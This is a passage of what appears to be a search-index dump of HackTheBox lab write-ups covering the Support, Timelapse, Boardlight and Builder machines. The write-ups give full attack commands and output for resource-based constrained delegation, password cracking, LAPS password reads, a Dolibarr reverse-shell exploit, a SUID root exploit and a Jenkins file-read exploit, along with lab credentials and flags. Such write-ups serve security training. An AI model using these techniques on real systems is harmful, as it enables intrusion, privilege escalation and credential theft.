-H ldap://support.htb -D \"support\\\\ldap\" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"CN=Users,DC=support,DC=htb\" \"objectClass=user\"\n</code></pre> <p>Looking at all the users, we see the info field in <code>support</code></p> <pre><code>info: Ironside47pleasure40Watchful\n</code></pre> <p>Now we have <code>support:Ironside47pleasure40Watchful</code> so let's try <code>evil-winrm</code></p> <pre><code>*Evil-WinRM* PS C:\\&gt; whoami                                                                                           support\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"support/#privilege-escalation","title":"Privilege Escalation","text":"<p>Enumerating with <code>bloodhound</code> we see that our user has <code>GenericAll</code> over the <code>dc</code> host so we can perform a Resource-Based Constrained Delegation as seen here: https://github.com/tothi/rbcd-attack</p> <p></p> <pre><code>$ impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass buenas123@ -dc-ip 10.10.11.174 support.htb/support:'Ironside47pleasure40Watchful'\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Successfully added machine account evilcomputer$ with password buenas123@.\n\n\n$ python rbcd.py -f evilcomputer -t dc -dc-ip 10.10.11.174 support\\\\support:Ironside47pleasure40Watchful \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Starting Resource Based Constrained Delegation Attack against dc$\n[*] Initializing LDAP connection to 10.10.11.174\n[*] Using support\\support account with password ***\n[*] LDAP bind OK\n[*] Initializing domainDumper()\n[*] Initializing LDAPAttack()\n[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `evilcomputer` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `dc`\n[*] Delegation rights modified succesfully!\n[*] evilcomputer$ can now impersonate users on dc$ via S4U2Proxy\n\n\n$ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/evilcomputer$:buenas123@\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache\n</code></pre> <p>Using the ticket, log in to the machine via <code>psexec</code>.</p> <pre><code>$ KRB5CCNAME=/home/kali/support/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache  impacket-psexec -k dc.support.htb\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.support.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file aqaqcjvd.exe\n[*] Opening SVCManager on dc.support.htb.....\n[*] Creating service DCKN on dc.support.htb.....\n[*] Starting service DCKN.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.20348.859]\n(c) Microsoft Corporation. All rights reserved.\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"support/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\desktop\\root.txt\n833c01f16a54a30451cbf1250366ba41\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"timelapse/","title":"Timelapse","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"timelapse/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.152\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 10:48 CET\nNmap scan report for 10.10.11.152\nHost is up (0.040s latency).\nNot shown: 65518 filtered tcp ports (no-response)\nPORT      STATE SERVICE           VERSION\n53/tcp    open  domain            Simple DNS Plus\n88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-11-26 17:48:50Z)\n135/tcp   open  msrpc             Microsoft Windows RPC\n139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ldapssl?\n3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  globalcatLDAPssl?\n5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_ssl-date: 2024-11-26T17:50:19+00:00; +7h59m58s from scanner time.\n| tls-alpn: \n|_  http/1.1\n| ssl-cert: Subject: commonName=dc01.timelapse.htb\n| Not valid before: 2021-10-25T14:05:29\n|_Not valid after:  2022-10-25T14:25:29\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf            .NET Message Framing\n49667/tcp open  msrpc             Microsoft Windows RPC\n49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc             Microsoft Windows RPC\n49693/tcp open  msrpc             Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-11-26T17:49:40\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 122.68 seconds\n</code></pre> <p>Enumerating shares with an empty session, we find a file in <code>Shares/Dev</code></p> <pre><code>$ smbclient -U \"\" -L //10.10.11.152/ -N\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/timelapse]\n\u2514\u2500$ smbclient -U \"\" -L //10.10.11.152/   \nPassword for [WORKGROUP\\]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Shares          Disk      \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/timelapse]\n\u2514\u2500$ smbclient -U \"\"  //10.10.11.152/Shares \nPassword for [WORKGROUP\\]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Mon Oct 25 17:39:15 2021\n  ..                                  D        0  Mon Oct 25 17:39:15 2021\n  Dev                                 D        0  Mon Oct 25 21:40:06 2021\n  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021\n\n                6367231 blocks of size 4096. 2473840 blocks available\nsmb: \\&gt; cd Dev\nsmb: \\Dev\\&gt; ls\n  .                                   D        0  Mon Oct 25 21:40:06 2021\n  ..                                  D        0  Mon Oct 25 21:40:06 2021\n  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021\n\n                6367231 blocks of size 4096. 2473840 blocks available\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"timelapse/#initial-access","title":"Initial Access","text":"<p>The file has a password, so we use <code>fcrackzip</code></p> <pre><code>$ fcrackzip -u  -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip\n\nPASSWORD FOUND!!!!: pw == supremelegacy\n</code></pre> <p>We have a password, and inside, a <code>.pfx</code> cert but it has a password too. We can use crackpkcs12 (<code>p12tool</code> doesn't work)</p> <pre><code>$ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ../timelapse/legacyy_dev_auth.pfx\n\nDictionary attack - Starting 2 threads\n\n*********************************************************\nDictionary attack - Thread 1 - Password found: thuglegacy\n*********************************************************\n</code></pre> <p>Now we can extract the private and public keys, knowing this is a <code>winrm</code> cert</p> <pre><code>$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out public.crt\n$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key -nodes\n</code></pre> <p>And try <code>evil-winrm</code> with it</p> <pre><code>$ evil-winrm -i 10.10.11.152 -c public.crt -k private.key -S\nEvil-WinRM shell v3.7\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name         SID\n================= ============================================\ntimelapse\\legacyy S-1-5-21-671920749-559770252-3318990721-1603\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                          Attributes\n=========================================== ================ ============================================ ==================================================\nEveryone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group\nTIMELAPSE\\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"timelapse/#privilege-escalation","title":"Privilege Escalation","text":"<p>We find credentials in a PowerShell log file</p> <pre><code>*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nwhoami\nipconfig /all\nnetstat -ano |select-string LIST\n$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\ninvoke-command -computername localhost -credential $c -port 5986 -usessl -\nSessionOption $so -scriptblock {whoami}\nget-aduser -filter * -properties *\nexit\n</code></pre> <p>So we have <code>svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV</code></p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name            SID\n==================== ============================================\ntimelapse\\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                          Attributes\n=========================================== ================ ============================================ ==================================================\nEveryone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group\nTIMELAPSE\\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>We are in the <code>LAPS_Readers</code> group, so we can try to read passwords. Trying with <code>crackmapexec --laps</code> doesn't work, so I'll try thehacker.recipes AD LAPS DACL read</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'                                                                                 \n\nDistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb                                          \nDNSHostName                 : dc01.timelapse.htb                                                                         \nEnabled                     : True                                                                                       \nms-mcs-admpwd               : m{292kr#Es(3K8R7u86t(l$J                                                                   \nms-mcs-admpwdexpirationtime : 133775487108929601                                                                         \nName                        : DC01                                                                                       \nObjectClass                 : computer                                                                                   \nObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f                                                       \nSamAccountName              : DC01$                                                                                      \nSID                         : S-1-5-21-671920749-559770252-3318990721-1000                                               \nUserPrincipalName           :                                 \n</code></pre> <p>And we have <code>m{292kr#Es(3K8R7u86t(l$J</code>. Let's try <code>evil-winrm</code> again.</p> <pre><code>$ evil-winrm -i 10.10.11.152 -u Administrator -p 'm{292kr#Es(3K8R7u86t(l$J' -S\n\nEvil-WinRM shell v3.7\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users&gt; type C:\\Users\\TRX\\Desktop\\root.txt\n9d79b183ad51bba6ee55bc4dc8cde987\n*Evil-WinRM* PS C:\\Users&gt; type C:\\Users\\legacyy\\Desktop\\user.txt\n88e15f354746b78a87e0a74163c59165\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"timelapse/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags</p> <pre><code>*Evil-WinRM* PS C:\\Users&gt; type C:\\Users\\TRX\\Desktop\\root.txt\n9d79b183ad51bba6ee55bc4dc8cde987\n*Evil-WinRM* PS C:\\Users&gt; type C:\\Users\\legacyy\\Desktop\\user.txt\n88e15f354746b78a87e0a74163c59165\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"boardlight/","title":"Boardlight","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"boardlight/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.11 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 19:03 CEST\nNmap scan report for 10.10.11.11\nHost is up (0.042s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)\n|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)\n|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nDevice type: general purpose|router\nRunning: Linux 5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   41.30 ms 10.10.14.1\n2   41.98 ms 10.10.11.11\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.55 seconds\n</code></pre> <p>The site at port <code>80</code> shows a template of a cybersec company.</p> <p></p> <p>There is an email.</p> <p></p> <p>Add the domain to <code>/etc/hosts</code>.</p> <p>Using <code>wfuzz</code> let's discover subdomains.</p> <pre><code>$ wfuzz -c --hh 15949 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.board.htb\" http://board.htb\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://board.htb/\nTotal requests: 4989\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                               \n=====================================================================\n\n000000072:   200        149 L    504 W      6360 Ch     \"crm\"                                 \n\nTotal time: 4.428437\nProcessed Requests: 4989\nFiltered Requests: 4988\nRequests/sec.: 1126.582\n</code></pre> <p>Add <code>crm.board.htb</code> to <code>/etc/hosts</code>.</p> <p>Navigating to that subdomain we get a Dolibarr instance <code>17.0.0</code>.</p> <p></p> <p>Trying <code>admin:admin</code> works.</p> <p></p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"boardlight/#initial-access","title":"Initial Access","text":"<p>Using this exploit https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253, create a listener and execute it.</p> <pre><code>$ python exploit.py http://crm.board.htb admin admin 10.10.14.11 80             \n[*] Trying authentication...\n[**] Login: admin\n[**] Password: admin\n[*] Trying created site...\n[*] Trying created page...\n[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection\n</code></pre> <pre><code>$ sudo rlwrap nc -lnvp 80                       \n[sudo] password for kali: \nlistening on [any] 80 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.11] 59606\nbash: cannot set terminal process group (855): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami\nwhoami\nwww-data\n</code></pre> <p>In the Dolibarr config folder we can find MySQL credentials.</p> <pre><code>ww-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php\ncat conf.php\n...\n$dolibarr_main_url_root='http://crm.board.htb';\n$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';\n$dolibarr_main_url_root_alt='/custom';\n$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';\n$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';\n$dolibarr_main_db_host='localhost';\n$dolibarr_main_db_port='3306';\n$dolibarr_main_db_name='dolibarr';\n$dolibarr_main_db_prefix='llx_';\n$dolibarr_main_db_user='dolibarrowner';\n$dolibarr_main_db_pass='serverfun2$2023!!';\n$dolibarr_main_db_type='mysqli';\n$dolibarr_main_db_character_set='utf8';\n$dolibarr_main_db_collation='utf8_unicode_ci';\n// Authentication settings\n$dolibarr_main_authentication='dolibarr';\n...\n</code></pre> <p>Pivot to user <code>larissa</code> with the MySQL password.</p> <pre><code>www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa\nsu larissa\nPassword: serverfun2$2023!!\n\nlarissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ whoami\nwhoami\nlarissa\n</code></pre> <pre><code>larissa@boardlight:~$ cat user.txt\ncat user.txt\n06457c0df24e027ea565aedc9b0122a8\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"boardlight/#privilege-escalation","title":"Privilege Escalation","text":"<p>Looking at SUID bit we have Enlightenment <code>0.23.1</code>.</p> <pre><code>larissa@boardlight:/var/log$ enlightenment --version\nESTART: 0.00001 [0.00001] - Begin Startup\nESTART: 0.00020 [0.00020] - Signal Trap\nESTART: 0.00028 [0.00007] - Signal Trap Done\nESTART: 0.00039 [0.00011] - Eina Init\nESTART: 0.00075 [0.00036] - Eina Init Done\nESTART: 0.00084 [0.00009] - Determine Prefix\nESTART: 0.00101 [0.00017] - Determine Prefix Done\nESTART: 0.00106 [0.00005] - Environment Variables\nESTART: 0.00111 [0.00005] - Environment Variables Done\nESTART: 0.00116 [0.00005] - Parse Arguments\nVersion: 0.23.1\nE: Begin Shutdown Procedure!\n</code></pre> <p>There is a PE exploit via <code>searchsploit</code>.</p> <p></p> <p>Execute it and get root.</p> <pre><code>larissa@boardlight:~$ ./exploit.sh \nCVE-2022-37706\n[*] Trying to find the vulnerable SUID file...\n[*] This may take few seconds...\n[+] Vulnerable SUID binary found!\n[+] Trying to pop a root shell!\n[+] Welcome to the rabbit hole :)\nmount: /dev/../tmp/: can't find in /etc/fstab.\n# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"boardlight/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code># cat /root/root.txt                                                                                      \n38da93b2c8510a48d47ca63cd514e4dd \n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"builder/","title":"Builder","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"builder/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 23:57 CEST\nNmap scan report for 10.10.11.10\nHost is up (0.041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n8080/tcp open  http    Jetty 10.0.18\n| http-robots.txt: 1 disallowed entry \n|_/\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-title: Dashboard [Jenkins]\n|_http-server-header: Jetty(10.0.18)\nAggressive OS guesses: Linux 5.0 (98%), Linux 5.0 - 5.14 (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 3 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT      ADDRESS\n1   41.26 ms 10.10.14.1\n2   ...\n3   41.37 ms 10.10.11.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 32.72 seconds\n</code></pre> <p>Port <code>8080</code> has a Jenkins instance running version <code>2.441</code>.</p> <p></p> <p>Searching for exploits, there is an LFI one.</p> <p></p> <pre><code>$ python 51993.py -u http://10.10.11.10:8080/ -p /etc/passwd\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nroot:x:0:0:root:/root:/bin/bash\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\njenkins:x:1000:1000::/var/jenkins_home:/bin/bash\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n</code></pre> <p>Now, we see that Jenkins has the path in <code>/var/jenkins_home</code> but we don't know what files to read. Deploy Jenkins locally to see all the interesting files and their paths.</p> <pre><code>$ docker pull jenkins/jenkins:2.441\n2.441: Pulling from jenkins/jenkins\n1b13d4e1a46e: Pull complete \na618211e3ec8: Pull complete \n9dc069cd1830: Pull complete \nDigest: sha256:6bb8ea0eda544dddee8b3794936bd239e77281d59cce0f76586fa2c262e056f8\nStatus: Downloaded newer image for jenkins/jenkins:2.441\ndocker.io/jenkins/jenkins:2.441\n\n$ docker images                              \nREPOSITORY        TAG       IMAGE ID       CREATED         SIZE\njenkins/jenkins   2.441     fb91cdedcf6c   16 months ago   474MB\n\n$ docker run --rm -p 8080:8080 jenkins/jenkins:2.441           \nRunning from: /usr/share/jenkins/jenkins.war\n...\n\n*************************************************************\n*************************************************************\n*************************************************************\n\nJenkins initial setup is required. An admin user has been created and a password generated.\nPlease use the following password to proceed to installation:\n\ne86d54dcc63f40b0af8440b05f2a6793\n\nThis may also be found at: /var/jenkins_home/secrets/initialAdminPassword\n</code></pre> <p>Browse the Jenkins site and enter the password to complete the installation and generate the files.</p> <p></p> <p>Once installed, enter the container.</p> <pre><code>$ docker exec -it 87b87c16f877 /bin/sh\n$ whoami\njenkins\n$ env\nJENKINS_HOME=/var/jenkins_home\nJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental\nHOSTNAME=87b87c16f877\nHOME=/var/jenkins_home\nJENKINS_UC=https://updates.jenkins.io\nREF=/usr/share/jenkins/ref\nTERM=xterm\nJENKINS_VERSION=2.441\nJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals\nPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nLANG=C.UTF-8\nJENKINS_SLAVE_AGENT_PORT=50000\nCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log\nJAVA_HOME=/opt/java/openjdk\nPWD=/\n</code></pre> <p>Inside <code>users</code> we find our newly created user and <code>users.xml</code> with the user path.</p> <pre><code>$ cat users.xml\n&lt;?xml version='1.1' encoding='UTF-8'?&gt;\n&lt;hudson.model.UserIdMapper&gt;\n  &lt;version&gt;1&lt;/version&gt;\n  &lt;idToDirectoryNameMap class=\"concurrent-hash-map\"&gt;\n    &lt;entry&gt;\n      &lt;string&gt;administrator&lt;/string&gt;\n      &lt;string&gt;administrator_3984506477770267804&lt;/string&gt;\n    &lt;/entry&gt;\n  &lt;/idToDirectoryNameMap&gt;\n&lt;/hudson.model.UserIdMapper&gt;$ \n</code></pre> <p>Knowing this path, we can enter the user's folder and read <code>config.xml</code> with the password.</p> <pre><code>$ cat config.xml\n&lt;?xml version='1.1' encoding='UTF-8'?&gt;\n&lt;user&gt;\n  &lt;version&gt;10&lt;/version&gt;\n  &lt;id&gt;administrator&lt;/id&gt;\n  &lt;fullName&gt;asdf&lt;/fullName&gt;\n  &lt;properties&gt;\n    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;\n    &lt;hudson.model.MyViewsProperty&gt;\n      &lt;views&gt;\n        &lt;hudson.model.AllView&gt;\n          &lt;owner class=\"hudson.model.MyViewsProperty\" reference=\"../../..\"/&gt;\n          &lt;name&gt;all&lt;/name&gt;\n          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;\n          &lt;filterQueue&gt;false&lt;/filterQueue&gt;\n          &lt;properties class=\"hudson.model.View$PropertyList\"/&gt;\n        &lt;/hudson.model.AllView&gt;\n      &lt;/views&gt;\n    &lt;/hudson.model.MyViewsProperty&gt;\n    